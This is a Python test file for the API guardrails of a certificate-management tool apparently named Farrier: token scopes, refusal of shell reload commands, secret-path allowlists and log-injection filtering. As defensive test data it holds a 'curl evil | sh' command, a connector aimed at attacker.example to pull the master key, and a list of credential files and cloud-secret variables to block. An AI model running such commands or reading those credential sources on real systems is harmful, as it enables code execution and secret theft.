"""Hosting guardrails: token scopes, no shell commands over the API, no reading Farrier's own secrets."""
import os

import pytest
from fastapi.testclient import TestClient

from farrier.api.app import create_app
from farrier.core.engine import Engine
from farrier.security.vault import SecretRefused, resolve_secret

ADMIN = {"authorization": "Bearer admin-token"}
READER = {"authorization": "Bearer read-token"}


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("FARRIER_API_TOKEN", "admin-token")
    monkeypatch.setenv("FARRIER_API_READ_TOKEN", "read-token")
    monkeypatch.delenv("FARRIER_ALLOW_API_COMMANDS", raising=False)
    eng = Engine(tmp_path / "data", issuers={"default": {"kind": "local"}})
    return eng, TestClient(create_app(eng))


def test_tokens_are_scoped(client):
    _, c = client
    assert c.get("/api/summary").status_code == 401
    assert c.get("/api/summary", headers={"authorization": "Bearer nope"}).status_code == 401
    assert c.get("/api/summary", headers=READER).status_code == 200
    assert c.post("/api/tick", headers=READER).status_code == 403      # read-only token cannot change anything
    assert c.post("/api/tick", headers=ADMIN).status_code == 200


def test_api_refuses_shell_commands(client):
    _, c = client
    ep = {"name": "web1", "host": "127.0.0.1", "port": 9, "connector": "files",
          "connector_config": {"cert_path": "/tmp/c.pem", "key_path": "/tmp/k.pem", "reload_command": "curl evil | sh"}}
    r = c.post("/api/endpoints", json=ep, headers=ADMIN)
    assert r.status_code == 400 and "reload_command" in r.json()["detail"]


def test_api_commands_allowed_when_operator_opts_in(client, monkeypatch, tmp_path):
    monkeypatch.setenv("FARRIER_ALLOW_API_COMMANDS", "1")
    eng = Engine(tmp_path / "data2", issuers={"default": {"kind": "local"}})
    c = TestClient(create_app(eng))
    ep = {"name": "web1", "host": "127.0.0.1", "port": 9, "connector": "files",
          "connector_config": {"cert_path": "/tmp/c.pem", "key_path": "/tmp/k.pem", "reload_command": "nginx -s reload"}}
    assert c.post("/api/endpoints", json=ep, headers=ADMIN).status_code == 200


def test_connector_cannot_read_farriers_own_secrets(client, monkeypatch):
    eng, c = client
    monkeypatch.setenv("FARRIER_MASTER_KEY", "x" * 44)
    ep = {"name": "lb", "host": "127.0.0.1", "connector": "f5",
          "connector_config": {"url": "https://attacker.example", "username": "u",
                               "password": "env:FARRIER_MASTER_KEY", "profile": "/Common/p"}}
    r = c.post("/api/endpoints", json=ep, headers=ADMIN)
    assert r.status_code == 400 and "refused" in r.json()["detail"]

    with pytest.raises(SecretRefused):
        resolve_secret(f"file:{eng.data_dir / 'master.key'}")
    with pytest.raises(SecretRefused):
        resolve_secret("env:FARRIER_API_TOKEN")


def test_secret_allowlists(monkeypatch, tmp_path):
    monkeypatch.setenv("FARRIER_SECRET_ENV_PREFIX", "FARRIER_SECRET_")
    monkeypatch.setenv("FARRIER_SECRET_F5", "s3cret")
    monkeypatch.setenv("HOME_PASSWORD", "nope")
    assert resolve_secret("env:FARRIER_SECRET_F5") == "s3cret"
    with pytest.raises(SecretRefused):
        resolve_secret("env:HOME_PASSWORD")

    ok_dir = tmp_path / "secrets"
    ok_dir.mkdir()
    (ok_dir / "f5").write_text("pw")
    (tmp_path / "other").write_text("pw")
    monkeypatch.setenv("FARRIER_SECRET_DIRS", str(ok_dir))
    assert resolve_secret(f"file:{ok_dir / 'f5'}") == "pw"
    with pytest.raises(SecretRefused):
        resolve_secret(f"file:{tmp_path / 'other'}")


def test_changes_are_attributed(client):
    eng, c = client
    ep = {"name": "vpn", "host": "127.0.0.1", "port": 9, "connector": "manual"}
    c.post("/api/endpoints", json=ep, headers=ADMIN | {"x-farrier-actor": "alice@corp"})
    assert any("saved by alice@corp" in e["message"] for e in c.get("/api/events", headers=READER).json())
    # a header that is not a plain name is never written to the log
    c.post("/api/endpoints", json=ep | {"name": "vpn2"}, headers=ADMIN | {"x-farrier-actor": "x\nFAKE LOG LINE"})
    assert any("saved by api" in e["message"] for e in c.get("/api/events", headers=READER).json())


def test_secret_refs_never_reach_system_files_or_farrier_and_cloud_credentials(monkeypatch, tmp_path):
    from farrier.security.vault import check_secret_ref
    monkeypatch.delenv("FARRIER_SECRET_ENV_PREFIX", raising=False)
    token = tmp_path / "vault-token"
    token.write_text("s.root")
    monkeypatch.setenv("FARRIER_SECRET_VAULT_TOKEN_FILE", str(token))
    monkeypatch.setenv("FARRIER_SECRET_DIRS", os.pathsep.join([str(tmp_path), "/"]))   # too broad: no help
    for ref in ("file:/proc/self/environ", "file:/proc/1/environ", "file:/sys/class/dmi/id/product_uuid",
                "file:/dev/fd/0", "file:/var/run/secrets/kubernetes.io/serviceaccount/token",
                "file:/run/secrets/kubernetes.io/serviceaccount/token", f"file:{token}",
                "env:FARRIER_DATABASE_PASSWORD", "env:FARRIER_MCP_TOKEN", "env:FARRIER_LEADER_KEY",
                "env:AWS_SECRET_ACCESS_KEY", "env:AWS_SESSION_TOKEN", "env:AZURE_CLIENT_SECRET", "env:VAULT_TOKEN",
                "env:ACTIONS_ID_TOKEN_REQUEST_TOKEN", "env:GOOGLE_APPLICATION_CREDENTIALS"):
        with pytest.raises(SecretRefused):
            check_secret_ref(ref)
    check_secret_ref("env:FARRIER_SECRET_F5")                  # the user-secret namespace stays usable
    check_secret_ref(f"file:{tmp_path / 'f5'}")
    monkeypatch.setenv("FARRIER_SECRET_ENV_PREFIX", "FARRIER_CONN_")
    check_secret_ref("env:FARRIER_CONN_F5")
    with pytest.raises(SecretRefused):
        check_secret_ref("env:FARRIER_SECRET_F5")


def test_files_and_keystore_connectors_refuse_paths_in_farriers_data_dir(client, tmp_path, monkeypatch):
    eng, c = client
    monkeypatch.setenv("FARRIER_SECRET_KS", "changeit")
    data = tmp_path / "data"
    for kind, cfg in (("files", {"cert_path": str(tmp_path / "srv" / "c.pem"), "key_path": str(data / "master.key")}),
                      ("files", {"cert_path": str(data / ".." / "data" / "farrier.db"), "key_path": "/srv/k.pem"}),
                      ("keystore", {"path": str(data / "sub" / "tls.p12"), "password": "env:FARRIER_SECRET_KS"})):
        r = c.post("/api/endpoints", headers=ADMIN, json={"name": f"n{len(str(cfg))}", "host": "h", "port": 443,
                                                          "connector": kind, "connector_config": cfg})
        assert r.status_code == 400 and "data directory" in r.text, r.text
    from farrier.connectors import make_connector
    make_connector("files", {"cert_path": str(tmp_path / "srv" / "c.pem"), "key_path": str(tmp_path / "srv" / "k.pem")},
                   eng.data_dir)
